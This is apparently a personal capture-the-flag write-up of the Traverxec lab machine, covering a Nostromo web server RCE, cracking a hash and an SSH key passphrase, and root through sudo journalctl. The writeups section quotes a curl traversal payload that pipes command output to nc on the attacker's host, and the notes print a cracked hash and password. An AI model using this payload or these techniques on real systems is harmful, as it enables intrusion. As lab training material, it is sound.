# <span style="color:#FF9966">Machine #18 Traverxec</span>  


## <span style="color:#FF9966">Notes During Working on the Machine 🧐🤓   

* Web server being used called "Nostromo" version 1.9.6.
* Seems like it's vulnerable to an RCE.
* But the code searchsploit provides sucks I'll try and find another one.
* That if the website is even vulnerable to it. 
* I've got a reverse shell using the exploit. Seems like the exploit was right on spot
* Now let's get to priv esc.
* I got a password for david hopefully he's reusing it.
  ```cmd
  -rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd                 
  david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
  ```  
* Cracked the password Nowonly4me.
* This password is useless I tried it with SSH david, su, as the password for sudo of www-data, ssh root, su root and even sshed on localhost.

* The Nostromo web server was vulnerable to the easiest rce I've ever encountered (v1.9.6) so I got access as www-data easily.
* What I've tried and found so far  
  * A useless password of david's that I cracked. UPDATE Maybe I can make a list of all permutations possible for the password I found and brute force the SSH (But it seems impossible).
  * A nameserver IP address.
  * The sudo version is vulnerable (1.8.27) but not in my current user.
  * There's a kernel exploit for the Linux version we have (I'm gonna try it & if it works look for the intended way then).
  * No sign of any DBs. UPDATE I can't run any kernel exploit because there's no c compiler on the victim. 
  * The log file "wtmp" maybe I can transfer it to my box through `nc` & then try & find a way of reading it.
  * The processes seem to be borningly legit. UPDATE DEADEND.
  * No interesting crons.
  * No interesting SUID.
  * No interesting capabilities.
* Maybe the web server is what will et me David because he's the admin. UPDATE I've researched the web server's files nothing seems interesting.
* David is in a number of groups the most interesting one seem to be `video` which seems also useless at the moment [netdev, video, plugdev, floppy, cdrom, audio, dip].
* This turned out to be the freaking directory's name `public_www` that opens in browser
* I have the ssh key but the password I have is not working as a passphrase for the key. I will try and bruteforce it.
* Found it and it's `hunter`
<br/><br/>


## <span style="color:#FF9966">How Did I Solve the Machine 😎🥳 
1. I found an http service with Nostromo web server version 1.9.6 which had a directory traversal vulnerability with an exploit python code that was easy to use.
2. I got foothold on the system as `www-data` and I scoured the system for something until I realized that the conf file of the web server had something.
3. It turned out that with Nostromo we can access the home directories on the system which meant we can access david's home unless he stops me from doing so.
4. So I was able to access the home of david but at first I wasn't really sure what I can access inside of it.
5. Finally, I realized that there's a directory called `www_public` that's the root of the david home that is accessed through the browser and I was able to list the insides of this directory to find out that there is a zip file that has a backup of the home of david with the information of the SSH.
6. Then I had to bruteforce the ssh key with `ssh2john.py` and then `john` to find out the passphrase of the key and this way I got david.
7. Root was relatively easy because I was able to `sudo journalctl` and when opening something with it as I found in "gtfobins" we can write `!/bin/sh` which opens a root shell.

<br/><br/>



## <span style="color:#FF9966">Where I Got Stuck?😡😧  

* I haven't read the configuration file of the web server properly. I should've looked for nostromo's documentation and found out what everything in the file meant because I was looking for a way to access david's directory and the word `/home` should've been a hint for me to think of this config file. 

<br/><br/>



## <span style="color:#FF9966">What Did I learn from this Machine?👀  

* That sometimes there could be directories that I don't have read permissions to but I have read permissions to its children. To the files inside of it.

<br/><br/>



## <span style="color:#FF9966">Writeups ✍🏽📓   

### 0xdf hacks stuff  

* He didn't use the exploit code but tried to exploit the vulnerability on his own by using `curl` as follows  

  ```
  curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d "id | nc 10.10.14.6 443"
  ```
* In the previous code he sent a POST request with `curl` and then piped the output into an `nc [their IP] 443` and that he will be listening on the port `443` to get the output their[I like the idea].

<br/><br/>




<!-- @nested-tags:machines/directory_traversal/Traverxec,machines/screwed_up_permissions/Traverxec-->